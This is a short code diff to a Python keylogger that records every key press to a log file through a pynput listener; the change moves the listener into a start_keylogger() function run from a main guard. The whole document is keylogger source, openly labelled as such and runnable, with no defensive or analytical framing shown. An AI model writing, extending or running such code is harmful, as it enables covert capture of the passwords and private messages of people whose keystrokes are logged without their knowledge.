@@ -10,5 +10,10 @@ def on_press(key):
         with open(log_file, "a") as f:
             f.write(f"[{key}]")
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+def start_keylogger():
+    """Starts the keylogger."""
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    start_keylogger()
